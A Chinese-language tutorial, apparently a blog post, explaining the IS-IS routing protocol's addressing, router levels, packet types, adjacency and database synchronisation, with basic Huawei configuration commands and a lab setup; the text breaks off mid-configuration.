    <content type="html"><![CDATA[<center><h1>中间系统到中间系统 IS-IS</h1></center>[TOC]<blockquote><p><font color="blue">IS-IS是ISO为CLNP[<font color="black">ConnectionLessNetwork Protocol，无连接网络协议]</font>设计的一种动态路由协议</font></p></blockquote><p>随着TCP/IP协议的流行，为了提供对IP路由的支持，IETF在RFC1195中对IS-IS进行了扩充和修改，使它能够同时应用在TCP/IP和OSI环境中，我们将扩展后的IS-IS称为<strong>集成IS-IS</strong></p><h2 id="IS-IS的基本概念"><a href="#IS-IS的基本概念" class="headerlink" title="IS-IS的基本概念"></a>IS-IS的基本概念</h2><p>IS-IS概述：IS-IS是一种<font color="red">链路状态路由协议</font>，是ISO定义的OSI协议栈中的CLNS是ConnectionLess Network Service，无连接网络服务的一部分</p><ul><li><p>CLNS (CLNS也是一种无连接的网络) 由以下三个部分组成</p><ul><li><p>CLNP：类似于TCP/IP中的IP协议。</p></li><li><p>IS-IS：类似于TCP/IP中的OSPF</p></li><li><p>ES-IS：类似于TCP/IP中的ARP，ICMP等</p></li></ul></li><li><p>ES：End System，终端系统，类似于IP网络环境中的主机</p></li><li><p>ES-IS：End System to Intermediate System，终端系统到中间系统</p></li></ul><h3 id="IS-IS地址结构"><a href="#IS-IS地址结构" class="headerlink" title="IS-IS地址结构"></a>IS-IS地址结构</h3><h5 id="NSAP："><a href="#NSAP：" class="headerlink" title="NSAP："></a>NSAP：</h5><blockquote><p><font color="blue">NSAP Network Service Access Point，网络服务访问点</font>，是OSI协议栈中用于定位资源的地址，主要用于提供网络层和上层应用之间的接口</p></blockquote><ul><li>NSAP包括IDP（Initial Domian Part）及DSP（Domian Specific Part）如下图所示：</li></ul><img src="https://shierjinghuang.github.io/2023/03/26/链路状态路由协议IS-IS/IS-IS地址结构.png" style="zoom:80%;" /><center>IS-IS地址结构</center>- IDP，由AFI(Authority and Format Identifier)与IDI(Initial Domain Identifier)两部分组成，AFI表示地址分配机构和地址格式，IDI用来标识域- DSP相当于IP地址中的子网号和主机地址。由High Order DSP、System ID和SEL三个部分组成，High Order DSP用来分割区域，System ID用来区分主机，SEL（NSAP Selector）用来指示服务类型<h5 id="NET："><a href="#NET：" class="headerlink" title="NET："></a>NET：</h5><blockquote><p><font color="blue">NET 网络实体名称：是OSI协议栈中设备的网络层信息，主要用于路由计算</font>，由区域地址Area ID和System ID组成，可以看作是特殊的NSAP</p></blockquote><ul><li><p>NET的长度与NSAP的相同，最长为20Byte，最短为8Byte</p></li><li><p>在IP网络中运行IS-IS时，只需配置NET，根据NET地址设备可以获取到Area ID以及System ID。</p></li><li><p><font color="blue">Area ID被称为区域地址</font>，由IDP和DSP中的High Order DSP组成，能标识路由域，也标识路由域中的区域</p><ul><li>一般情况下，一个路由器只需要配置一个区域地址，且同一区域中所有节点的区域地址都要相同。为了支持区域的平滑合并、分割及转换，缺省情况下，一个IS-IS进程下最多可配置3个区域地址。</li></ul></li><li><p>System ID用来在区域内唯一标识主机或路由器。在设备的实现中，它的长度固定为6Byte。</p><ul><li>System ID通常由root ID扩展得到</li></ul></li></ul><h3 id="IS-IS拓扑结构"><a href="#IS-IS拓扑结构" class="headerlink" title="IS-IS拓扑结构"></a>IS-IS拓扑结构</h3><ul><li>IS-IS在自治系统内采用骨干区域与非骨干区域两级的分层结构：<ul><li>Level-1路由器部署在非骨干区域</li><li>Level-2路由器和Level-1-2路由器部署在骨干区域</li></ul></li><li>每一个非骨干区域都通过Level-1-2路由器与骨干区域相连</li></ul><p><strong>补充IS-IS与OSPF的区别：</strong></p><ul><li>在IS-IS中，每个路由器都只属于一个区域；而在OSPF中，一个路由器的不同接口可以属于不同的区域</li><li>在IS-IS中，单个区域没有骨干与非骨干区域的概念；而在OSPF中，Area0被定义为骨干区域</li><li>在IS-IS中，Level-1和Level-2级别的路由都采用SPF算法，分别生成最短路径树SPT；而在OSPF中，只有在同一个区域内才使用SPF算法，区域之间的路由需要通过骨干区域来转发</li></ul><h4 id="IS-IS路由器的分类"><a href="#IS-IS路由器的分类" class="headerlink" title="IS-IS路由器的分类"></a>IS-IS路由器的分类</h4><img src="https://shierjinghuang.github.io/2023/03/26/链路状态路由协议IS-IS/IS-IS路由器分类示意图.png" style="zoom:80%;" /><h5 id="Level-1路由器"><a href="#Level-1路由器" class="headerlink" title="Level-1路由器"></a>Level-1路由器</h5><p>Level-1路由器是一种<font color="red">IS-IS区域内部路由器</font>，它<font color="blue">只与属于同一区域的Level-1和Level-1-2路由器形成邻接关系，这种邻接关系称为Level-1邻接关系</font></p><ul><li><p>Level-1路由器无法与Level-2路由器建立邻接关系</p></li><li><p>Level-1路由器只负责维护Level-1的链路状态数据库LSDB，该LSDB只包含本区域的路由信息</p></li><li><p>Level-1路由器必须通过Level-1-2路由器接入IS-IS骨干区域从而访问其他区域。</p></li></ul><p><strong>Level-1-2路由器</strong></p><p>同时属于Level-1和Level-2的路由器称为Level-1-2路由器，它可以与同一区域的Level-1和Level-1-2路由器形成Level-1邻接关系，也可以与其他区域的Level-2和Level-1-2路由器形成Level-2的邻接关系</p><ul><li><font color="orange">Level-1-2路由器也是IS-IS骨干网络的组成部分</font></li><li>Level-1-2路由器维护两个LSDB，Level-1的LSDB用于区域内路由，Level-2的LSDB用于区域间路由</li></ul><p><strong>Level-2路由器</strong><br><font color="red">Level-2路由器，是IS-IS骨干路由器</font>，可以与同一或者不同区域的Level-2路由器或者Level-1-2路由器形成邻接关系</p><ul><li>Level-2路由器维护一个Level-2的LSDB，该LSDB包含整个IS-IS域的所有路由信息</li><li>所有形成Level-2邻接关系的路由器组成路由域的骨干网，负责在不同区域间通信</li><li>路由域中Level-2级别的路由器必须是物理连续的，以保证骨干网的连续性</li></ul><p><strong>IS-IS支持的网络类型：</strong><font color="orange">IS-IS会自动根据接口的数据链路层封装决定该接口的缺省网络类型</font> ， IS-IS支持两种类型的网络，广播Broadcast和点到点P2P网络如PPP、 HDLC等</p><h4 id="IS-IS开销值"><a href="#IS-IS开销值" class="headerlink" title="IS-IS开销值"></a>IS-IS开销值</h4><p>IS-IS使用Cost（开销）作为路由度量值，<font color="red">Cost值越小，则路径越优</font></p><ul><li>IS-IS链路的Cost与设备的接口有关，每一个激活了IS-IS的接口都会维护接口Cost</li><li><font color="blue">IS-IS接口的Cost在缺省情况下并不与接口带宽相关</font>，无论接口带宽多大，<font color="blue">缺省时Cost为10</font></li></ul><p><font color="FF6600">一条IS-IS路径的Cost等于本路由器到达目标网段沿途的<strong>所有链路的Cost总和</strong></font></p><ul><li>IS-IS有三种方式来确定接口的开销，按照优先级由高到低分别是：<ul><li>接口开销：为单个接口设置开销</li><li>全局开销：为所有接口设置开销</li><li>自动计算开销：根据接口带宽自动计算开销</li></ul></li></ul><blockquote><p>在早期的ISO10589中，使能IS-IS的接口下最大只能配置值为63的开销值，此时IS-IS的开销类型为narrow</p></blockquote><blockquote><p>RFC3784中规定，使能IS-IS的接口开销值可以扩展到16777215，此时IS-IS的开销类型为wide</p></blockquote><ul><li>缺省时，华为路由器采用的开销类型是narrow</li><li>narrow类型下使用的TLV：<ul><li>128号TLV（IP Internal Reachability TLV）：用来携带路由域内的IS-IS路由信息</li><li>130号TLV（IP External Reachability TLV）：用来携带路由域外的IS-IS路由信息</li><li>2号TLV(IS Neighbors TLV)：用来携带邻居信息。</li></ul></li><li>wide类型下使用的TLV：<ul><li>135号TLV(Extended IP Reachability TLV)：用来替换原有的IP reachability TLV，携带IS-IS路由信息，它扩展了路由开销值的范围，并可以携带sub TLV</li><li>22号TLV（IS Extended Neighbors TLV）：用来携带邻居信息</li></ul></li></ul><h3 id="IS-IS报文类型"><a href="#IS-IS报文类型" class="headerlink" title="IS-IS报文类型"></a>IS-IS报文类型</h3><p><font color="blue">IS-IS报文是直接封装在数据链路层的帧结构中的</font></p><ul><li>PDU，协议数据单元可以分为两个部分，报文头 IS-IS Header和变长字段部分 Variable Length Fields</li><li>IS-IS Header又可分为通用头部 PDU Common Header和专用头部 PDU Specific Header<ul><li>对于所有PDU来说，通用报头都是相同的，但专用报头根据PDU类型不同而有所差别</li></ul></li></ul><img src="https://shierjinghuang.github.io/2023/03/26/链路状态路由协议IS-IS/IS-IS报文类型.png" style="zoom:67%;" /><h4 id="IS-IS通用字段详解："><a href="#IS-IS通用字段详解：" class="headerlink" title="IS-IS通用字段详解："></a>IS-IS通用字段详解：</h4><p><strong>重要字段解释：</strong></p><img src="https://shierjinghuang.github.io/2023/03/26/链路状态路由协议IS-IS/IS-IS通用首部.png" style="zoom: 80%;" /><ul><li>Intradomain Routing Protocol Discriminator：域内路由选择协议鉴别符，固定为0x83</li><li>Length Indicator：IS-IS头部的长度（包括通用头部和专用头部），以Byte为单位</li><li>Version/Protocol ID Extension：版本/协议标识扩展，固定为0x01</li><li>System ID Length：NSAP地址或NET中System ID区域的长度。值为0时，表示System ID区域的长度为6Byte</li><li>R（Reserved）：保留，固定为0</li><li>Version：固定为0x01</li><li>Max.Areas：支持的最大区域个数。设置为1～254的整数，表示该IS-IS进程实际所允许的最大区域地址数；设置为0，表示该IS-IS进程最大只支持3个区域地址数</li></ul><h4 id="IS-IS报文类型概述"><a href="#IS-IS报文类型概述" class="headerlink" title="IS-IS报文类型概述"></a>IS-IS报文类型概述</h4><blockquote><p><font color="fasa">IS-IS的PDU有4种类型：IIH，LSP 链路状态报文，CSNP 全序列号报文，PSNP 部分序列号报文</font></p></blockquote><p><strong>IIH IS-IS Hello报文：用于建立和维持邻接关系</strong></p><ul><li>广播网络中的Level-1 IS-IS路由器使用Level-1 LAN IIH，广播网络中的Level-2 IS-IS路由器使用Level-2 LAN IIH</li><li>点到点网络中则使用P2P IIH</li></ul><p><strong>LSP 链路状态报文：用于交换链路状态信息</strong></p><ul><li>LSP分为两种，Level-1 LSP、Level-2 LSP</li></ul><p><strong>SNP 序列号报文：通过描述全部或部分链路数据库中的LSP来同步各LSDB，从而维护LSDB的完整与同步</strong></p><ul><li>SNP包括CSNP 全序列号报文和PSNP 部分序列号报文，进一步又可分为Level-1 CSNP、 Level-2 CSNP、 Level-1 PSNP和Level-2 PSNP。</li></ul><h4 id="IS-IS常见的TLV"><a href="#IS-IS常见的TLV" class="headerlink" title="IS-IS常见的TLV"></a>IS-IS常见的TLV</h4><p>IS-IS报文首部有一个TLV字段，TLV的含义是：类型（TYPE），长度（LENGTH），值（VALUE）。该字段实际上是一个数据结构，这个结构包含了这三部分</p><blockquote><p>使用TLV结构构建报文的好处是<font color="blue">灵活性和扩展性好</font>。采用TLV使得报文的整体结构固定，增加新特性只需要增加新TLV即可，不需要改变整个报文的整体结构。</p></blockquote><table><thead><tr><th>TLV Type</th><th>名称</th><th>PDU类型</th></tr></thead><tbody><tr><td>1</td><td>Area Addresses                                                  区域地址</td><td>IIH、LSP</td></tr><tr><td>2</td><td>IS Neighbors（LSP）                                         中间系统邻接</td><td>LSP</td></tr><tr><td>4</td><td>Partition Designated Level2 IS                         区域分段指定L2中间系统</td><td>L2、LSP</td></tr><tr><td>6</td><td>IS Neighbors（MAC Address）                        中间系统邻接</td><td>LAN、IIH</td></tr><tr><td>7</td><td>IS Neighbors（SNPA Address）                       中间系统邻接</td><td>LAN、IIH</td></tr><tr><td>8</td><td>Padding                                                                填充</td><td>IIH</td></tr><tr><td>9</td><td>LSP Entries                                                           LSP条目</td><td>SNP</td></tr><tr><td>10</td><td>Authentication Information                              验证信息</td><td>IIH、LSP、SNP</td></tr><tr><td>128</td><td>IP Internal Reachability Information               IP内部可达性信息</td><td>LSP</td></tr><tr><td>129</td><td>Protocols Supported                                          支持的协议</td><td>IIH、LSP</td></tr><tr><td>130</td><td>IP External Reachability Information              IP外部可达性信息</td><td>LSP</td></tr><tr><td>131</td><td>Inter-Domain Routing Protocol Information 域间路由选择协议信息</td><td>L2、 LSP</td></tr><tr><td>132</td><td>IP Interface Address                                          IP接口地址</td><td>IIH 、LSP</td></tr></tbody></table><h2 id="IS-IS工作原理"><a href="#IS-IS工作原理" class="headerlink" title="IS-IS工作原理"></a>IS-IS工作原理</h2><h3 id="IS-IS邻接关系建立原则"><a href="#IS-IS邻接关系建立原则" class="headerlink" title="IS-IS邻接关系建立原则"></a>IS-IS邻接关系建立原则</h3><ul><li><p>IS-IS按如下原则建立邻接关系：</p><ul><li>只有同一层次的相邻路由器才有可能成为邻接</li><li>对于Level-1路由器来说，Area ID必须一致</li><li>链路两端IS-IS接口的网络类型必须一致</li><li>链路两端IS-IS接口的地址必须处于同一网段</li></ul></li><li><p>IS-IS是直接运行在数据链路层上的协议，并且最早设计是给CLNP使用的，IS-IS邻接关系的形成与IP地址无关</p></li><li><p>在实际的部署中，在IP网络上运行IS-IS时，需要检查对方的IP地址的。如果接口配置了从IP，那么只要双方有某个IP在同一网段，就能建立邻接，不一定要主IP相同。</p></li></ul><h5 id="在以太网中的额外原则："><a href="#在以太网中的额外原则：" class="headerlink" title="在以太网中的额外原则："></a>在以太网中的额外原则：</h5><ul><li>通过将以太网接口模拟成点到点接口，可以建立点到点链路邻接关系</li><li>当链路两端IS-IS接口的地址不在同一网段时，如果配置接口对接收的Hello报文不作IP地址检查，也可以建立邻接关系<ul><li>对于点到点接口，可以配置接口忽略IP地址检查</li><li>对于以太网接口，需要将以太网接口模拟成点到点接口，然后才可以配置接口忽略IP地址检查</li></ul></li><li>一般情况下，一个接口只需配置一个主IP地址，但在有些特殊情况下需要配置从IP地址</li></ul><h5 id="IIH报文"><a href="#IIH报文" class="headerlink" title="IIH报文"></a>IIH报文</h5><p>IIH报文用于建立和维持邻接关系，广播网络中的Level-1 IS-IS路由器使用Level-1 LAN IIH；广播网络中的Level-2 IS-IS路由器使用Level-2 LAN IIH；点到点网络中则使用P2P IIH</p><ul><li>Reserved/Circuit Type：表示路由器的类型 01表示L1，10表示L2，11表示L1/L2</li><li>Source ID  ：发出Hello报文的路由器的System ID</li><li>Holding Time ： 保持时间。在此时间内如果没有收到邻接发来的Hello报文，则中止已建立的邻接关系</li><li>Priority ：选举DIS的优先级，取值范围为0～127。数值越大，优先级越高。该字段只在广播网中的Hello消息(LAN IIH消息)携带；点到点网络的Hello消息(P2P IIH消息)没有此字段，也没有此字段之前的R保留位</li><li>LAN ID： 包括DIS的System ID和伪节点ID。该字段只在广播网中的Hello消息(LAN IIH消息)携带；点到点网络的Hello消息(P2P IIH消息)没有此字段</li><li>Local Circuit ID：本地链路ID，该字段只在点到点网络的Hello消息(P2P IIH消息)携带；广播网中的Hello消息(LAN IIH消息)没有此字段。 </li></ul><h4 id="广播网络中的邻接关系建立过程"><a href="#广播网络中的邻接关系建立过程" class="headerlink" title="广播网络中的邻接关系建立过程"></a>广播网络中的邻接关系建立过程</h4><p>两台运行IS-IS的路由器在交互协议报文实现路由功能之前必须首先建立邻接关系。在不同类型的网络上，IS-IS的邻接建立方式并不相同。在广播网络中，使用三次握手建立邻接关系</p><ol><li>在Down状态下，R1组播发送Level-1 LAN IIH，此报文中邻接列表为空</li><li>R2收到此报文后，将邻接状态标识为Initial。R2再向R1回复Level-1 LAN IIH，此报文中标识R1为R2的邻接</li><li>R1收到此报文后，将自己与R2的邻接状态标识为Up。再向R2发送一个标识R2为R1邻接的Level-1 LAN IIH</li><li>R2收到此报文后，将自己与R1的邻接状态标识为Up。这样，两个路由器成功建立了邻接关系</li><li>广播网络中需要选举DIS，在邻接关系建立后，路由器会等待两个Hello报文间隔，再进行DIS的选举。</li></ol><h5 id="DIS与伪节点"><a href="#DIS与伪节点" class="headerlink" title="DIS与伪节点"></a>DIS与伪节点</h5><p>在广播网络中，IS-IS需要在所有的路由器中选举一个路由器作为DIS (指定中间系统) </p><ul><li>DIS用来创建和更新伪节点（Pseudonodes），并负责生成伪节点的LSP，用来描述网络上有哪些网络设备</li><li>伪节点是用来模拟广播网络的一个虚拟节点，并非真实的路由器。在IS-IS中，伪节点用DIS的System ID和Circuit ID（非0值）标识</li></ul><img src="https://shierjinghuang.github.io/2023/03/26/链路状态路由协议IS-IS/IS-IS DIS与伪结点.png" style="zoom: 67%;" /><h4 id="点到点网络中的邻接关系建立过程"><a href="#点到点网络中的邻接关系建立过程" class="headerlink" title="点到点网络中的邻接关系建立过程"></a>点到点网络中的邻接关系建立过程</h4><p>点到点网络中，邻接关系的建立使用两次握手方式：只要路由器收到对端发来的Hello报文，就单方面宣布邻接为Up状态，建立邻接关系<br>两次握手机制存在明显的缺陷，华为设备在点到点网络中使用IS-IS时，默认使用三次握手建立邻接关系。此方式通过三次发送P2P IIH最终建立起邻接关系</p><h3 id="链路状态数据库同步"><a href="#链路状态数据库同步" class="headerlink" title="链路状态数据库同步"></a>链路状态数据库同步</h3><h4 id="LSP"><a href="#LSP" class="headerlink" title="LSP"></a>LSP</h4><p>IS-IS链路状态报文LSP用于交换链路状态信息。LSP分为两种：Level–1 LSP和Level–2 LSP。Level–1 LSP由Level-1路由器传送，Level–2 LSP由Level-2路由器传送，Level-1-2路由器则可传送以上两种LSP</p><p>两类LSP有相同的报文格式</p><img src="https://shierjinghuang.github.io/2023/03/26/链路状态路由协议IS-IS/LSP报文格式.png" style="zoom:80%;" /><ul><li><strong>Remaining Lifetime</strong> : LSP的生存时间，以秒为单位</li><li><strong>LSP ID</strong>:由三部分组成，System ID、伪节点ID和LSP分片后的编号</li><li><strong>Sequence Number</strong>: LSP的序列号。在路由器启动时所发送的第一个LSP报文中的序列号为1，以后当需要生成新的LSP时，新LSP的序列号在前一个LSP序列号的基础上加1。更高的序列号意味着更新的LSP</li><li>Checksum ： LSP的校验和</li><li><strong>ATT</strong>（Attachment）：由Level-1-2路由器产生，用来指明始发路由器是否与其它区域相连。虽然此标志位也存在于Level-1和Level-2的LSP中，但实际上此字段只和Level-1-2路由器始发的L1 LSP有关</li><li>OL（LSDB Overload，1bit）：过载标志位。设置了过载标志位的LSP虽然还会在网络中扩散，但是在计算通过超载路由器的路由时不会被采用。即对路由器设置过载位后，其它路由器在进行SPF计算时不会考虑这台路由器。当路由器内存不足时，系统自动在发送的LSP报文中设置过载标志位</li><li>IS Type(2bit)：生成LSP的路由器的类型。用来指明是Level-1还是Level-2路由器（01表示Level-1，11表示Level-2）</li></ul><h5 id="CSNP："><a href="#CSNP：" class="headerlink" title="CSNP："></a>CSNP：</h5><p>CSNP包含该设备LSDB中所有的LSP摘要，路由器通过交互 CSNP来判断是否需要同步LSDB</p><ul><li>在广播网络上，CSNP由DIS定期发送    缺省的发送周期为10秒</li><li>在点到点网络上，CSNP只在第一次建立邻接关系时发送</li></ul><p><strong>CSNP报文格式：</strong></p><img src="https://shierjinghuang.github.io/2023/03/26/链路状态路由协议IS-IS/CNSP报文格式.png" style="zoom:67%;" /><ul><li>Source ID：发出CSNP报文的路由器的System ID</li><li>Start LSP：CSNP报文中第一个LSP的ID值</li><li>End LSP ID：CSNP报文中最后一个LSP的ID值</li></ul><h5 id="PSNP："><a href="#PSNP：" class="headerlink" title="PSNP："></a>PSNP：</h5><p>PSNP只包含部分LSP的摘要信息 ：</p><ul><li>当发现LSDB不同步时，PSNP来请求邻居发送新的LSP</li><li>在点到的网络中，当收到LSP时，使用PSNP对收到的LSP进行确认</li></ul><img src="https://shierjinghuang.github.io/2023/03/26/链路状态路由协议IS-IS/PSNP报文格式.png"  /><ul><li>Source ID：发出PSNP报文的路由器的System ID。 </li></ul><h4 id="LSP的同步过程"><a href="#LSP的同步过程" class="headerlink" title="LSP的同步过程"></a>LSP的同步过程</h4><h5 id="广播网络中LSP的同步过程"><a href="#广播网络中LSP的同步过程" class="headerlink" title="广播网络中LSP的同步过程:"></a>广播网络中LSP的同步过程:</h5><ul><li><p>广播网络中新加入路由器与DIS同步LSDB数据库的过程：</p><ol><li><p>新加入的路由器R3首先发送IIH报文，与该广播域中的路由器建立邻接关系。建立邻接关系之后，R3等待LSP刷新定时器超时，然后将自己的LSP发往组播地址（Level-1：01-80-C2-00-00-14；Level-2：01-80-C2-00-00-15）。这样网络上所有的邻接都将收到该LSP</p></li><li><p>该网段中的DIS会把收到R3的LSP加入到LSDB中，并等待CSNP报文定时器超时并发送CSNP报文</p></li><li><p>R3收到DIS发来的CSNP报文，对比自己的LSDB数据库，然后向DIS发送PSNP报文请求自己没有的LSP</p></li><li><p>DIS收到该PSNP报文请求后向R3发送对应的LSP进行LSDB的同步</p><img src="https://shierjinghuang.github.io/2023/03/26/链路状态路由协议IS-IS/广播网络中LSP的同步过程.png" alt="广播网络中LSP的同步过程" style="zoom:80%;" /></li></ol></li></ul><h5 id="点到点网络中LSP的同步过程"><a href="#点到点网络中LSP的同步过程" class="headerlink" title="点到点网络中LSP的同步过程"></a>点到点网络中LSP的同步过程</h5><ul><li><p>点到点网络上LSDB数据库的同步过程：</p><ul><li><p>R1先与R2建立邻接关系。</p></li><li><p>建立邻接关系之后，R1与R2会先发送CSNP给对端设备。如果对端的LSDB与CSNP没有同步，则发送PSNP请求索取相应的LSP</p></li><li><p>假设R2向R1索取相应的LSP</p><ol><li><p>R1发送R2请求的LSP的同时启动LSP重传定时器，并等待R2发送的PSNP作为收到LSP的确认</p></li><li><p>如果在接口LSP重传定时器超时后，R1没有收到R2发送的PSNP报文作为应答</p></li><li><p>则R1重新发送该LSP</p></li><li><p>R2收到LSP后，发送PSNP进行确认</p><img src="https://shierjinghuang.github.io/2023/03/26/链路状态路由协议IS-IS/点到点网络中LSP同步过程.png" style="zoom:67%;" /></li></ol></li></ul></li></ul><p><strong>LSP产生的原因，IS-IS路由域内的所有路由器都会产生LSP，以下事件会触发一个新的LSP：</strong></p><blockquote><ul><li>邻接Up或Down，IS-IS相关接口Up或Down，引入的IP路由发生变化，区域间的IP路由发生变化，接口被赋了新的metric值，周期性更新（刷新间隔15min）</li></ul></blockquote><h4 id="LSP的处理机制"><a href="#LSP的处理机制" class="headerlink" title="LSP的处理机制"></a>LSP的处理机制</h4><img src="https://shierjinghuang.github.io/2023/03/26/链路状态路由协议IS-IS/LSP的处理机制.png" style="zoom: 80%;" /><p>IS-IS通过交互LSP实现链路状态数据库同步，路由器收到LSP后，按照以下原则处理：</p><ul><li>若收到的LSP比本地LSP的更优，或者本地没有收到的LSP：<ul><li>在广播网络中：将其加入数据库，并组播发送新的LSP</li><li>在点到点网络中：将其加入数据库，并发送PSNP报文来确认收到此LSP，之后将这新的LSP发送给除了发送该LSP的邻居以外的邻居</li></ul></li><li>若收到的LSP和本地LSP无法比较出优劣，则不处理该LSP</li></ul><h3 id="路由计算"><a href="#路由计算" class="headerlink" title="路由计算"></a>路由计算</h3><h4 id="Level-1路由器的路由计算"><a href="#Level-1路由器的路由计算" class="headerlink" title="Level-1路由器的路由计算"></a>Level-1路由器的路由计算</h4><ul><li>R1是Level-1路由器，只维护Level-1 LSDB，该LSDB中包含同属一个区域的R2及R3以及R1自己产生的Level-1 LSP</li><li>R1根据LSDB中的Level-1 LSP计算出Area 49.0001内的拓扑，以及到达区域内各个网段的路由信息</li><li>R2及R3作为Area 49.0001内的Level-1-2路由器，会在它们向该区域下发的Level-1 LSP中设置ATT标志位，用于向区域内的Level-1路由器宣布可以通过自己到达其他区域。 R1作为Level-1路由器，会根据该ATT标志位，计算出指向R2或R3的默认路由</li></ul><img src="https://shierjinghuang.github.io/2023/03/26/链路状态路由协议IS-IS/Level-1路由器的路由计算.png" alt="Level-1路由器的路由计算" style="zoom:80%;" /><h5 id="Level-1路由器的次优路径的问题"><a href="#Level-1路由器的次优路径的问题" class="headerlink" title="Level-1路由器的次优路径的问题"></a>Level-1路由器的次优路径的问题</h5><p>缺省时， R1只能通过指向R2或R3的默认路由到达区域外部，但是R1距离R2和R3路由器的Cost值相等，那么当R1发送数据包到192.168.20.0/24时，就有可能选择路径2，导致出现次优路径。</p><h5 id="路由渗透"><a href="#路由渗透" class="headerlink" title="路由渗透"></a>路由渗透</h5><p>缺省情况下，Level-1-2路由器不会将到达其他区域的路由通告本Level-1区域中。<br>通过路由渗透，可以将区域间路由通过Leve-1-2路由器传递到Level-1区域，此时Leve-1路由器可以学习到其他区域的详细路由，从而计算出最优路径。</p><h4 id="Level-1-2路由器的路由计算"><a href="#Level-1-2路由器的路由计算" class="headerlink" title="Level-1-2路由器的路由计算"></a>Level-1-2路由器的路由计算</h4><p>R2及R3都维护Level-1 LSDB，它们能够通过这些LSDB中的LSP计算出Area 49.0001的路由。<br>R2及R3都维护Level-2 LSDB，它们能够通过这些LSDB中的LSP计算出Area 49.0002的路由。<br>R2及R3将到达Area 49.0001的路由以Level-2 LSP的形式发送到Area 49.0002。</p><h4 id="Level-2路由器的路由计算"><a href="#Level-2路由器的路由计算" class="headerlink" title="Level-2路由器的路由计算"></a>Level-2路由器的路由计算</h4><p>R4及R5作为Level-2路由器，只会维护Level-2 LSDB，它们能够根据该LSDB计算出到达全网各个网段的路由。</p><h2 id="IS-IS的基本配置"><a href="#IS-IS的基本配置" class="headerlink" title="IS-IS的基本配置"></a>IS-IS的基本配置</h2><h3 id="IS-IS协议的基本配置"><a href="#IS-IS协议的基本配置" class="headerlink" title="IS-IS协议的基本配置"></a>IS-IS协议的基本配置</h3><p>1 . 创建IS-IS进程，进入IS-IS进程</p><pre class="line-numbers language-none"><code class="language-none">isis [process-id] <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>参数process-id用来指定一个IS-IS进程,如果不指定参数process-id，则系统默认的进程为1</p><p>2 . 配置网络实体名称</p><pre class="line-numbers language-none"><code class="language-none">network-entity net<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>通常情况下，一个IS-IS进程下配置一个NET即可。当区域需要重新划分时，例如将多个区域合并，或者将一个区域划分为多个区域，这种情况下配置多个NET可以在重新配置时仍然能够保证路由的正确性。由于一个IS-IS进程中区域地址最多可配置3个，所以NET最多也只能配3个。在配置多个NET时，必须保证它们的System ID都相同</p><p>3 . 配置全局Level级别</p><pre class="line-numbers language-none"><code class="language-none">is-level &#123; level-1 | level-1-2 | level-2 &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>缺省情况下，设备的Level级别为level-1-2。</p><ul><li>在网络运行过程中，改变IS-IS设备的级别可能会导致IS-IS进程重启并可能会造成IS-IS邻居断连，建议用户在配置IS-IS时即完成设备级别的配置。 </li></ul><p>4 . 在接口上使能IS-IS协议</p><pre class="line-numbers language-none"><code class="language-none">isis enable [ process-id ]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在接口视图下配置该命令后，IS-IS将通过该接口建立邻居、扩散LSP报文。</p><p>5 .  配置接口Level级别</p><pre class="line-numbers language-none"><code class="language-none">isis circuit-level [ level-1 | level-1-2 | level-2 ]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>缺省情况下，接口的Level级别为level-1-2。<br>两台Level-1-2设备建立邻居关系时，缺省情况下，会分别建立Level-1和Level-2邻居关系。如果只希望建立Level-1或者Level-2的邻居关系，可以通过修改接口的Level级别实现。</p><p>6 .  修改接口的DIS优先级</p><pre class="line-numbers language-none"><code class="language-none">isis dis-priority priority [level-1 | level-2]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>缺省情况下，IS-IS接口DIS优先级为64，该命令用来指定挑选对应层次DIS（Designated Intermediate System）时接口的优先级</p><h3 id="IS-IS配置实验："><a href="#IS-IS配置实验：" class="headerlink" title="IS-IS配置实验："></a>IS-IS配置实验：</h3><img src="https://shierjinghuang.github.io/2023/03/26/链路状态路由协议IS-IS/IS-IS配置实验拓扑.png" /><h4 id="配置接口IP"><a href="#配置接口IP" class="headerlink" title="配置接口IP"></a>配置接口IP</h4><h4 id="配置IS-IS基本功能"><a href="#配置IS-IS基本功能" class="headerlink" title="配置IS-IS基本功能"></a>配置IS-IS基本功能</h4><h5 id="配置R1"><a href="#配置R1" class="headerlink" title="# 配置R1"></a># 配置R1</h5><pre class="line-numbers language-华为" data-language="华为"><code class="language-华为">[R1] isis 1[R1-isis-1] is-level level-1[R1-isis-1] network-entity 10.0000.0000.0001.00[R1-isis-1] quit[R1] interface gigabitethernet 0&#x2F;0&#x2F;0[R1-GigabitEthernet0&#x2F;0&#x2F;0] isis enable 1[R1-GigabitEthernet0&#x2F;0&#x2F;0] quit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="配置R3"><a href="#配置R3" class="headerlink" title="# 配置R3"></a># 配置R3</h5><pre class="line-numbers language-华为" data-language="华为"><code class="language-华为">[R3] isis 1[R3-isis-1] is-level level-1[R3-isis-1] network-entity 10.0000.0000.0003.00[R3-isis-1] quit[R3] interface gigabitethernet 0&#x2F;0&#x2F;0[R3-GigabitEthernet0&#x2F;0&#x2F;0] isis enable 1[R3-GigabitEthernet0&#x2F;0&#x2F;0] quit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="配置R2"><a href="#配置R2" class="headerlink" title="# 配置R2"></a># 配置R2</h5><pre class="line-numbers language-华为" data-language="华为"><code class="language-华为">[R2] isis 1[R2-isis-1] network-entity 10.0000.0000.0002.00[R2-isis-1] quit[R2] interface gigabitethernet 0&#x2F;0&#x2F;0[R2-GigabitEthernet0&#x2F;0&#x2F;0] isis enable 1[R2-GigabitEthernet0&#x2F;0&#x2F;0] quit[R2] interface gigabitethernet 0&#x2F;0&#x2F;1[R2-GigabitEthernet0&#x2F;0&#x2F;1] isis enable 1[R2-GigabitEthernet0&#x2F;0&#x2F;2] quit[R2] interface gigabitethernet 3&#x2F;0&#x2F;0[R2-GigabitEthernet0&#x2F;0&#x2F;2] isis enable 1[R2-GigabitEthernet0&#x2F;0&#x2F;2] quit<span aria-hidden="true" 